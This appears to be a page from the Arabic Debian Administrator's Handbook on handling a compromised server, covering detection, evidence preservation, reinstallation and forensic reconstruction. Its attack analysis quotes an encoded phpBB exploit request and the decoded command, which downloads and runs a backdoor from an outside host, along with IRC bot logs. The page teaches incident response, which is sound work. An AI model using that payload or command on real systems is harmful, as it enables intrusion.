@@ -1,0 +1,339 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html
+    xmlns="http://www.w3.org/1999/xhtml"><head><meta
+        http-equiv="Content-Type"
+        content="text/html; charset=UTF-8" /><title
+        xmlns:d="http://docbook.org/ns/docbook">14.6. التعامل مع جهاز مُختَرَق</title><link
+        rel="stylesheet"
+        type="text/css"
+        href="Common_Content/css/default.css" /><link
+        rel="stylesheet"
+        media="print"
+        href="Common_Content/css/print.css"
+        type="text/css" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="generator"
+        content="publican v4.3.1" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="package"
+        content="Debian-debian-handbook-8-ar-MA-1.0-1" /><meta
+        name="keywords"
+        content="الجدار الناري, Netfilter, IDS/NIDS" /><link
+        rel="home"
+        href="index.html"
+        title="دفتر مدير دبيان" /><link
+        rel="up"
+        href="security.html"
+        title="فصل 14. الأمن" /><link
+        rel="prev"
+        href="sect.other-security-considerations.html"
+        title="14.5. اعتبارات أمنية أخرى" /><link
+        rel="next"
+        href="debian-packaging.html"
+        title="فصل 15. إنشاء حزمة دبيان" /><link
+        rel="canonical"
+        href="http://l.github.io/debian-handbook/html/ar-MA/sect.dealing-with-compromised-machine.html" /></head><body
+      dir="rtl"
+      class="draft "><noscript><iframe
+          src="//www.googletagmanager.com/ns.html?id=GTM-5H35QX"
+          height="0"
+          width="0"
+          style="display:none;visibility:hidden"></iframe></noscript><script
+        type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&amp;l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5H35QX');</script><div
+        id="banner"><a
+          href="http://debian-handbook.info/get/"><span
+            class="text">Download the ebook</span></a></div><p
+        id="title"><a
+          class="left"
+          href="http://www.debian.org"><img
+            alt="Product Site"
+            src="Common_Content/images//image_left.png" /></a><a
+          class="right"
+          href="http://debian-handbook.info"><img
+            alt="Documentation Site"
+            src="Common_Content/images//image_right.png" /></a></p><ul
+        class="docnav top"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>السابق</strong></a></li><li
+          class="home">دفتر مدير دبيان</li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>التالي</strong></a></li></ul><div
+        class="section"><div
+          class="titlepage"><div><div><h2
+                class="title"><a
+                  id="sect.dealing-with-compromised-machine"></a>14.6. التعامل مع جهاز مُختَرَق</h2></div></div></div><div
+          class="para">
+			بالرغم من أحسن النوايا ومهما كانت السياسة الأمنية مصممة بحذر، سيواجه مدير النظام حالة قرصنة في النهاية. يقدّم هذا القسم بعض الإرشادات عن كيفية التصرف عند مواجهة هذه الظروف المشؤومة.
+		</div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140225819825216"></a>14.6.1. اكتشاف وملاحظة تطفل المخترقين</h3></div></div></div><div
+            class="para">
+				الخطوة الأولى في مواجهة الاختراق هي اكتشاف هذا النشاط. لا يُظهِر النشاط نفسه، خصوصاً في حال غياب البنية التحتية المناسبة لمراقبة النظام.
+			</div><div
+            class="para">
+				لا تُكتشَف النشاطات التخريبية غالباً قبل أن تؤثر مباشرة على الخدمات المشروعة التي يستضيفها الجهاز، مثل انخفاض سرعة الاتصالات، أو عدم قدرة بعض المستخدمين على الاتصال، أو أي نوع آخر من الأعطال. عند مواجهة هذه المشاكل، يضطر مدير النظام لفحص الجهاز جيداً وتقصي العطل بحذر. هذا هو الوقت الذي يكتشف فيه عملية غير عادية، مثل عملية اسمها <code
+              class="literal">apache</code> بدلاً من العملية النظامية <code
+              dir="ltr"
+              class="literal">/usr/sbin/apache2</code>. إذا أردنا متابعة هذا المثال، الخطوة التالية هي ملاحظة رقم تتعريف العملية، والتحقق من <code
+              dir="ltr"
+              class="filename">/proc/<em
+                class="replaceable">pid</em>/exe</code> لمعرفة البرنامج الذي تُنفّذه هذه العملية حالياً:
+			</div><pre
+            class="screen">
+<code
+              class="computeroutput"># </code><strong
+              class="userinput"><code>ls -al /proc/3719/exe</code></strong>
+<code
+              class="computeroutput">lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</code>
+</pre><div
+            class="para">
+				برنامج مُثبّتٌ في <code
+              class="filename">/var/tmp/</code> ويعمل كمخدم وب؟ لا مجال للشك، الجهاز مُختَرَق.
+			</div><div
+            class="para">
+				هذا مثال واحد فقط، لكن هناك تلميحات أخرى كثيرة يمكن أن تثير حفيظة مدير النظام:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						عدم عمل أحد خيارات أمر ما؛ الإصدارة التي يدعيها البرنامج لا تطابق الإصدارة التي يُفتَرض أنها مثبتة حسب <code
+                    class="command">dpkg</code>؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						ترحيب من سطر الأوامر أو جلسة العمل يُظهِر أن آخر اتصال كان من مخدم غير معروف من قارة أخرى؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						أخطاء ناجمة عن امتلاء قسم <code
+                    class="filename">/tmp/</code>، الذي تبيّن أنه محشو بنسخ غير قانونية للأفلام؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						وغير ذلك.
+					</div></li></ul></div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140225819812800"></a>14.6.2. فصل المخدم عن الشبكة</h3></div></div></div><div
+            class="para">
+				في جميع الحالات عدا العجيبة منها، ترد الاختراقات من الشبكة، ويحتاج المهاجم لشبكة فعالة للوصول إلى أهدافه (الوصول لمعلومات سرية، مشاركة ملفات غير قانونية، إخفاء هويته عبر استخدام الجهاز كمحطة ترحيل، وغيرها). فصل الجهاز عن الشبكة سيمنع المهاجم من الوصول لهذه الأهداف، إن لم يتمكن من تحقيقها بعد.
+			</div><div
+            class="para">
+				قد لا يكون هذا ممكناً إذا لم يكن الوصول الفيزيائي للمخدم متاحاً. أما إذا كانت استضافة المخدم في مركز بيانات لمزود خدمة يقع في الجانب الآخر من البلاد، أو إذا لم يكن الوصول للمخدم ممكناً لأي سبب آخر، فمن الجيد عادة البدء بجمع بعض المعلومات المهمة (انظر الأقسام التالية)، ثم عزل ذلك المخدم قدر المستطاع عبر إيقاف أكبر عدد ممكن من الخدمات (كل الخدمات عدا <code
+              class="command">sshd</code> عادة). لا تزال هذه الحالة غير ملائمة، لأنك لا تستطيع الجزم بأن المهاجم لا يملك صلاحيات الدخول عبر SSH كما هي حال مدير النظام؛ هذا يجعل ”تنظيف“ الأجهزة أصعب.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140225819809360"></a>14.6.3. الاحتفاظ بكل ما يمكن استخدامه كدليل</h3></div></div></div><div
+            class="para">
+				لفهم الهجوم و (أو) اتخاذ إجراءات قانونية ضد المهاجمين يجب أخذ نسخ عن جميع العناصر المهمة؛ هذا يتضمن محتويات القرص الصلب، ولائحة بجميع العمليات الفعالة، ولائحة بجميع الاتصالات المفتوحة. يجب استخدام محتويات الذاكرة RAM أيضاً، لكنها نادراً ما تستخدم عملياً.
+			</div><div
+            class="para">
+				في غمرة الحدث؛ يميل مديرو النظم غالباً لتنفيذ العديد من الفحوصات على الجهاز المُختَرَق؛ هذه ليست فكرة جيدة عادة. أي أمر تنفذه يحتمل أن يمسح جزءاً من الأدلة. يجب تقليل الفحوصات إلى أقل ما يمكن (<code
+              class="command">netstat -tupan</code> لاتصالات الشبكة، <code
+              class="command">ps auxf</code> للحصول على قائمة العمليات، <code
+              dir="ltr"
+              class="command">ls -alR /proc/[0-9]*</code> لمزيد من المعلومات الإضافية عن البرامج الفعالة)، كما يجب كتابة كل الفحوصات التي أجريت بحذر.
+			</div><div
+            class="sidebar"><div
+              class="titlepage"><div><div><p
+                    class="title"><strong><span
+                        class="emphasis"><em>تحذير</em></span> التحليل الساخن</strong></p></div></div></div><div
+              class="para">
+				رغم أن تحليل النظام أثناء عمله مغر جداً، خصوصاً عند عدم إمكانية الوصول الفيزيائي للمخدم، إلا أن الأفضل تفادي ذلك: ببساطة أنت لا تستطيع أن تثق بالبرامج المثبتة حالياً على النظام المخرب. من الممكن جداً أن يخفي أمر <code
+                class="command">ps</code> مُخرّب بعض العمليات، أو أن يخفي أمر <code
+                class="command">ls</code> مُعدَّل بعض الملفات؛ أحياناً حتى النواة قد تكون مُخرَّبَة!
+			</div><div
+              class="para">
+				إذا كان هناك حاجة لإجراء تحليل ساخن كهذا، فلا بد من أخذ الحيطة واستخدام برامج سليمة موثوقة. من الطرق الجيدة لفعل هذا استخدام CD إنقاذ فيه البرامج الأصلية، أو مشاركة شبكية للقراءة فقط. على أي حال، حتى هذه الإجراءات المضادة قد لا تكفي، إذا كانت النواة نفسها تعرضت للعبث.
+			</div></div><div
+            class="para">
+				فور حفظ العناصر ”الديناميكية“، الخطوة التالية هي تخزين صورة عن القرص الصلب. لا يمكن أخذ صورة كهذه إذا كان نظام الملفات في تغيُّر، ولذلك يجب إعاده ربطه في وضع القراءة فقط. أبسط حل في الغالب هو إيقاف المخدم قسراً (بعد تشغيل <code
+              class="command">sync</code>) وإعادة إقلاعه إلى قرص إنقاذ. يجب نسخ جميع الأقسام باستخدام أداة مثل <code
+              class="command">dd</code>؛ يمكن إرسال هذه الصور إلى مخدم آخر (ربما عبر استخدام الأداة <code
+              class="command">nc</code> التي تفيد كثيراً في إرسال البيانات الناتجة عن <code
+              class="command">dd</code> إلى جهاز آخر). هناك احتمال آخر ربما كان أبسط: فقط أخْرِج القرص من الجهاز واستبدله بآخر جديد يمكن إعادة تهيئته وتثبيت النظام عليه.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140225819798672"></a>14.6.4. إعادة التثبيت</h3></div></div></div><a
+            id="idm140225819798032"
+            class="indexterm"></a><a
+            id="idm140225819797264"
+            class="indexterm"></a><div
+            class="para">
+				يجب عدم إعادة وصل المخدم بالشبكة قبل إعادة تثبيت النظام عليه بالكامل. إذا كان الاختراق عميقاً (إذا حصل المهاجم على صلاحيات الإدارة)، فلا توجد طريقة أخرى تقريباً للتأكد من أننا تخلصنا من جميع مخلفات المهاجم (خصوصاً <span
+              class="emphasis"><em>الأبواب الخلفية backdoors</em></span>). طبعاً، يجب تطبيق آخر التحديثات الأمنية أيضاً لسد الثغرة التي استخدمها المهاجم. مثالياً، يجب أن يشير تحليل الهجوم إلى نوع الهجمة التي استخدمت، بحيث يتأكد المرء من إصلاحها حقاً؛ وإلا، فإنه لا يسع الإنسان إلا أن يأمل أن الثغرة كانت واحدة من الثغرات التي أصلحتها التحديثات.
+			</div><div
+            class="para">
+				إعادة تثبيت النظام على مخدم بعيد ليست عملية سهلة دوماً؛ قد تحتاج مساعدة من شركة الاستضافة، لأن بعض هذه الشركات لا توفر أنظمة مؤتمتة لإعادة تثبيت النظام. يجب الانتباه لعدم إعادة تثبيت نسخة احتياطية أُخذِت بعد حدوث الاختراق. مثالياً، يجب استعادة البيانات فقط، أما البرمجيات فيجب إعادة تثبيتها من وسائط التثبيت.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140225819793696"></a>14.6.5. التحليل الجنائي</h3></div></div></div><div
+            class="para">
+				بعد استعادة الخدمة، حان الوقت لفحص صور القرص المأخوذة من النظام المخترق في سبيل فهم طريقة الهجوم. عند ربط هذه الصور بنظام الملفات، يجب الانتباه لاستخدام الخيارات <code
+              class="literal">ro,nodev,noexec,noatime</code> لتفادي تعديل محتوياتها (بما في ذلك تواريخ الوصول للملفات) أو تشغيل برامج مشبوهة عن طريق الخطأ.
+			</div><div
+            class="para">
+				يشمل تتبع سلسلة أحداث الهجوم عادة البحث عن كل شيء تَعدَّل أو نُفِّذ:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						قراءة ملفات <code
+                    dir="ltr"
+                    class="filename">.bash_history</code> مثيرة جداً للاهتمام غالباً؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						كذلك سرد الملفات التي أنشئت مؤخراً، أو عدّلت أو فُتِحَت؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						يساعد الأمر <code
+                    class="command">strings</code> في التعرف على البرامج التي ثبّتَها المخترِق، عبر استخراج السلاسل النصية من الملفات الثنائية؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						تسمح ملفات السجلات في <code
+                    class="filename">/var/log/</code> غالباً بإعادة بناء تسلسل زمني للأحداث.
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						كما تسمح الأدوات المتخصصة باستعادة محتويات أي ملفات محذوفة، بما فيها ملفات السجلات التي يحذفها المهاجمون غالباً.
+					</div></li></ul></div><div
+            class="para">
+				يمكن تسهيل بعض هذه العمليات عبر استخدام برمجيات متخصصة. بالأخص، مجموعة <span
+              class="emphasis"><em>The Coroner Toolkit</em></span> (عُدَّة الطبيب الشرعي) في الحزمة <span
+              class="pkg pkg">tct</span> تحوي أدوات عديدة؛ منها، <code
+              class="command">grave-robber</code> التي تستطيع تجميع البيانات من نظام مُختَرَق لا يزال قيد التشغيل، و <code
+              class="command">lazarus</code> التي تستخرج بيانات مثيرة للاهتمام عادة من المناطق غير المُقسَّمة من الأقراص، وتستطيع <code
+              class="command">pcat</code> نسخ الذاكرة التي تستخدمها عملية ما؛ كما تحوي أيضاً أدوات أخرى لاستخراج البيانات. <a
+              id="idm140225819781776"
+              class="indexterm"></a>
+			</div><div
+            class="para">
+				توفر الحزمة <span
+              class="pkg pkg">sleuthkit</span> بضعة أدوات اخرى لتحليل نظام الملفات. تُسهّل الواجهة الرسومية <span
+              class="emphasis"><em>Autopsy Forensic Browser</em></span> (من الحزمة <span
+              class="pkg pkg">autopsy</span> ) استخدام هذه الأدوات. <a
+              id="idm140225819779120"
+              class="indexterm"></a>
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140225819778352"></a>14.6.6. إعادة بناء سيناريو الهجوم</h3></div></div></div><div
+            class="para">
+				يجب أن تنطبق جميع العناصر التي جُمِعَت أثناء عملية التحليل مع بعضها مثل قطع أحجية تركيب الصور؛ غالباً ما يترافق إنشاء أولى الملفات المشبوهة مع سجلات تُثْبت عملية الاختراق. يجب أن تكون الأمثلة الحقيقية أفصح من اللغو النظري.
+			</div><div
+            class="para">
+				السجل التالي هو جزء من سجل <code
+              class="filename">access.log</code> التابع لأباتشي:
+			</div><pre
+            class="programlisting">
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+</pre><div
+            class="para">
+				هذا المثال ناتج عن استغلال ثغرة أمنية قديمة في phpBB. <div
+              class="url">→ <a
+                href="http://secunia.com/advisories/13239/">http://secunia.com/advisories/13239/</a></div> <div
+              class="url">→ <a
+                href="http://www.phpbb.com/phpBB/viewtopic.php?t=240636">http://www.phpbb.com/phpBB/viewtopic.php?t=240636</a></div>
+			</div><div
+            class="para">
+				عبر فك تشفير عنوان URL الطويل هذا سنفهم أن المهاجم قد تمكن من تنفيذ كود PHP التالي: <code
+              dir="ltr"
+              class="command">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</code>. وبالفعل، لقد عثرنا على ملف <code
+              class="filename">bd</code> في <code
+              class="filename">/tmp/</code>. يعيد لنا تنفيذ <code
+              class="command">strings /mnt/tmp/bd</code> مجموعة سلاسل، منها <code
+              dir="ltr"
+              class="literal">PsychoPhobia Backdoor is starting...</code>. يبدو أنه باب خلفي فعلاً.
+			</div><div
+            class="para">
+				في وقت لاحق، استُخدِمَت هذه الصلاحيات لتنزيل وتثبيت وتشغيل <span
+              class="emphasis"><em>بوت</em></span> IRC يتصل بشبكة IRC سرية (underground). يمكن بعدها التحكم بالبوت عبر هذا البروتوكول وأمره بتنزيل ملفات للمشاركة. بل إن هناك سجل خاص بهذا البرنامج:
+			</div><pre
+            class="programlisting">** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
+</pre><div
+            class="para">
+				تُظهِر هذه الأمثلة تخزين ملفي فيديو على المخدم بوساطة العنوان 82.50.72.202.
+			</div><div
+            class="para">
+				على التوازي، عمد المهاجم إلى تنزيل زوج من الملفات الإضافية، <code
+              dir="ltr"
+              class="filename">/tmp/pt</code> و <code
+              dir="ltr"
+              class="filename">/tmp/loginx</code> تمرير هذين الملفين على <code
+              class="command">strings</code> يعطي سلاسل مثل <span
+              class="foreignphrase"><em
+                class="foreignphrase">Shellcode placed at 0x%08lx</em></span> و <span
+              dir="ltr"
+              class="foreignphrase"><em
+                dir="ltr"
+                class="foreignphrase">Now wait for suid shell...</em></span>. يبدوان وكأنهما برنامجين لاستغلال الثغرات المحلية للحصول على الصلاحيات الإدارية. لكن هل حققا هدفهما؟ في هذه الحالة، غالباً لم يصلا، لأنه لا يبدو أن هناك ملفات عُدّلت بعد الاختراق الأولي.
+			</div><div
+            class="para">
+				في هذا المثال، أعدنا بناء عملية التطفل كاملة، ويمكن أن نستنتج أن المهاجم تمكن من الاستفادة من النظام المخترق لحوالي ثلاثة أيام؛ لكن أهم عنصر في هذا التحليل هو أننا قد تعرفنا على الثغرة، ويستطيع مدير النظام أن يضمن أن الثغرة قد أُصلحَت فعلاً في التثبيت الجديد.
+			</div></div></div><ul
+        class="docnav"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>السابق</strong>14.5. اعتبارات أمنية أخرى</a></li><li
+          class="up"><a
+            accesskey="u"
+            href="#"><strong>أعلى</strong></a></li><li
+          class="home"><a
+            accesskey="h"
+            href="index.html"><strong>البداية</strong></a></li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>التالي</strong>فصل 15. إنشاء حزمة دبيان</a></li></ul><div
+        id="translated_pages"><ul><li><a
+              href="../ar-MA/sect.dealing-with-compromised-machine.html">ar-MA</a></li><li><a
+              href="../da-DK/sect.dealing-with-compromised-machine.html">da-DK</a></li><li><a
+              href="../de-DE/sect.dealing-with-compromised-machine.html">de-DE</a></li><li><a
+              href="../el-GR/sect.dealing-with-compromised-machine.html">el-GR</a></li><li><a
+              href="../en-US/sect.dealing-with-compromised-machine.html">en-US</a></li><li><a
+              href="../es-ES/sect.dealing-with-compromised-machine.html">es-ES</a></li><li><a
+              href="../fa-IR/sect.dealing-with-compromised-machine.html">fa-IR</a></li><li><a
+              href="../fr-FR/sect.dealing-with-compromised-machine.html">fr-FR</a></li><li><a
+              href="../hr-HR/sect.dealing-with-compromised-machine.html">hr-HR</a></li><li><a
+              href="../id-ID/sect.dealing-with-compromised-machine.html">id-ID</a></li><li><a
+              href="../it-IT/sect.dealing-with-compromised-machine.html">it-IT</a></li><li><a
+              href="../ja-JP/sect.dealing-with-compromised-machine.html">ja-JP</a></li><li><a
+              href="../pl-PL/sect.dealing-with-compromised-machine.html">pl-PL</a></li><li><a
+              href="../pt-BR/sect.dealing-with-compromised-machine.html">pt-BR</a></li><li><a
+              href="../ro-RO/sect.dealing-with-compromised-machine.html">ro-RO</a></li><li><a
+              href="../ru-RU/sect.dealing-with-compromised-machine.html">ru-RU</a></li><li><a
+              href="../tr-TR/sect.dealing-with-compromised-machine.html">tr-TR</a></li><li><a
+              href="../zh-CN/sect.dealing-with-compromised-machine.html">zh-CN</a></li></ul></div></body></html>
